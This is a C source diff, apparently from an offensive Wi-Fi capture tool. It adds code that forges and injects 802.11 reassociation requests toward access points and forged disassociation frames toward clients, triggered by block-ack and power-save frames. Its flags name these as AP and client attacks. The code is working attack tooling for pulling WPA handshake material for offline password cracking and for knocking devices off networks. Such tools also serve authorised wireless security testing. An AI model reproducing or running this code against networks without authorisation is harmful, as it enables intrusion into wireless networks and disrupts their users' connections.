@@ -797,6 +797,139 @@ outgoingcount++;
 return;
 }
 /*===========================================================================*/
+static inline void send_reassociation_req_wpa1(maclist_t *zeiger)
+{
+static mac_t *macftx;
+static capreqsta_t *stacapa;
+
+static const uint8_t reassociationrequestwpa1data[] =
+{
+/* supported rates */
+0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
+/* extended supported rates */
+0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
+/* power Capability */
+0x21, 0x02, 0x04, 0x14,
+/* vendor specific */
+0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
+/* WPA information (WPA1) */
+0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
+0x00, 0x50, 0xf2, 0x02, /* group cipher */
+0x01, 0x00, /* count */
+0x00, 0x50, 0xf2, 0x02, /* pairwise cipher */
+0x01, 0x00,  /* count */
+0x00, 0x50, 0xf2, 0x02, /* AKM */
+};
+#define REASSOCIATIONREQUESTWPA1_SIZE sizeof(reassociationrequestwpa1data)
+
+if(filtermode == 1)
+	{
+	if(isapinfilterlist(zeiger->addr) == true) return;
+	}
+else if(filtermode ==2)
+	{
+	if(isapinfilterlist(zeiger->addr) == false) return;
+	}
+packetoutptr = epbown +EPB_SIZE;
+memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +zeiger->essidlen);
+memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
+macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
+macftx->type = IEEE80211_FTYPE_MGMT;
+macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
+memcpy(macftx->addr1, zeiger->addr, 6);
+memcpy(macftx->addr2, macfrx->addr1, 6);
+memcpy(macftx->addr3, zeiger->addr, 6);
+macftx->duration = 0x013a;
+macftx->sequence = myclientsequence++ << 4;
+if(myclientsequence >= 4096) myclientsequence = 1;
+stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
+stacapa->capabilities = 0x0411;
+stacapa->listeninterval = 3;
+memcpy(stacapa->addr, zeiger->addr, 6);
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = zeiger->essidlen;
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE], &reassociationrequestwpa1data, REASSOCIATIONREQUESTWPA1_SIZE);
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x29] = CS_TKIP;
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x2f] = CS_TKIP;
+if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x35] = AK_PSK;
+if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA1_SIZE ) < 0)
+	{
+	perror("\nfailed to transmit reassociationrequest");
+	errorcount++;
+	}
+fsync(fd_socket);
+outgoingcount++;
+return;
+}
+/*===========================================================================*/
+static inline void send_reassociation_req_wpa2(maclist_t *zeiger)
+{
+static mac_t *macftx;
+static capreqsta_t *stacapa;
+
+static const uint8_t reassociationrequestwpa2data[] =
+{
+/* supported rates */
+0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
+/* extended supported rates */
+0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
+/* power Capability */
+0x21, 0x02, 0x04, 0x14,
+/* vendor specific */
+0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
+/* RSN information AES PSK (WPA2) */
+0x30, 0x14, 0x01, 0x00,
+0x00, 0x0f, 0xac, 0x02, /* group cipher */
+0x01, 0x00, /* count */
+0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
+0x01, 0x00, /* count */
+0x00, 0x0f, 0xac, 0x02, /* AKM */
+0x00, 0x00,
+};
+#define REASSOCIATIONREQUESTWPA2_SIZE sizeof(reassociationrequestwpa2data)
+
+if(filtermode == 1)
+	{
+	if(isapinfilterlist(zeiger->addr) == true) return;
+	}
+else if(filtermode ==2)
+	{
+	if(isapinfilterlist(zeiger->addr) == false) return;
+	}
+packetoutptr = epbown +EPB_SIZE;
+memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +zeiger->essidlen);
+memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
+macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
+macftx->type = IEEE80211_FTYPE_MGMT;
+macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
+memcpy(macftx->addr1, zeiger->addr, 6);
+memcpy(macftx->addr2, macfrx->addr1, 6);
+memcpy(macftx->addr3, zeiger->addr, 6);
+macftx->duration = 0x013a;
+macftx->sequence = myclientsequence++ << 4;
+if(myclientsequence >= 4096) myclientsequence = 1;
+stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
+stacapa->capabilities = 0x0411;
+stacapa->listeninterval = 3;
+memcpy(stacapa->addr, zeiger->addr, 6);
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = zeiger->essidlen;
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE], &reassociationrequestwpa2data, REASSOCIATIONREQUESTWPA2_SIZE);
+if((zeiger->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x25] = CS_CCMP;
+else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x25] = CS_TKIP;
+packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x2b] = CS_CCMP;
+if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x31] = AK_PSK;
+else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x31] = TAK_PSKSHA256;
+if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA2_SIZE ) < 0)
+	{
+	perror("\nfailed to transmit reassociationrequest");
+	errorcount++;
+	}
+fsync(fd_socket);
+outgoingcount++;
+return;
+}
+/*===========================================================================*/
 static inline void send_association_req_wpa2(maclist_t *zeiger)
 {
 static mac_t *macftx;
@@ -2325,6 +2458,27 @@ qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
 return;
 }
 /*===========================================================================*/
+static inline void process80211blockack()
+{
+static maclist_t *zeiger;
+
+for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
+	{
+	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
+	zeiger->timestamp = timestamp;
+	if(zeiger->status >= NET_M2) return;
+	if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+		{
+		send_ack();
+		send_reassociation_req_wpa2(zeiger);
+		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger);
+		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger);
+		}
+	return;
+	}
+if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_disassociation(macfrx->addr1, macfrx->addr2, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+}
+/*===========================================================================*/
 static inline void process80211powersave_poll()
 {
 static maclist_t *zeiger;
@@ -2334,7 +2488,7 @@ for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 	{
 	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
 	zeiger->timestamp = timestamp;
-	if(zeiger->status >= NET_M1) return;
+	if(zeiger->status >= NET_M2) return;
 	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
 		{
 		send_ack();
@@ -2357,7 +2511,7 @@ for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 	{
 	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
 	zeiger->timestamp = timestamp;
-	if(zeiger->status >= NET_M1) return;
+	if(zeiger->status >= NET_M2) return;
 	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_ack();
 	if((macfrx->to_ds == 1) && (macfrx->power == 0))
 		{
@@ -2409,6 +2563,17 @@ if(fd_pcapng > 0)
 for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 	{
 	if(zeiger->timestamp == 0) break;
+	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
+		{
+		zeiger->timestamp = timestamp;
+		if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+		if(zeiger->status < NET_M2)
+			{
+			if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger);
+			else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger);
+			}
+		return;
+		}
 	if(memcmp(zeiger->addr, macfrx->addr3, 6) != 0) continue;
 	zeiger->timestamp = timestamp;
 	if(zeiger->status < NET_M1) break;
@@ -3149,6 +3314,8 @@ if(macfrx->type == IEEE80211_FTYPE_MGMT)
 else if(macfrx->type == IEEE80211_FTYPE_CTL)
 	{
 	if(macfrx->subtype == IEEE80211_STYPE_PSPOLL) process80211powersave_poll();
+	if(macfrx->subtype == IEEE80211_STYPE_BACK) process80211blockack();
+	else return;
 	}
 else if(macfrx->type == IEEE80211_FTYPE_DATA)
 	{
